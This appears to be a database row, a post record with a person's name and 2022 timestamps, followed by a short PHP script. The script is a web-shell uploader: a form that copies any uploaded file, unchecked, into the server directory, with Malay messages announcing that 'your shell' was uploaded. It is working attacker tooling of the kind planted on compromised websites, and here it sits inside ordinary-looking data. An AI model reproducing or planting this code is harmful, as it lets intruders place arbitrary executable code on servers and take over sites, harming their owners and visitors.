8	101841	13	8	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	0	500	Salvador, Jacqueline	2022-03-31 00:12:53	\N	\N	posted	2022-04-05
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>'; }
else { echo '<b>Korang Gagal Upload Shell Korang!!!</b><br><br>'; }
}
?>
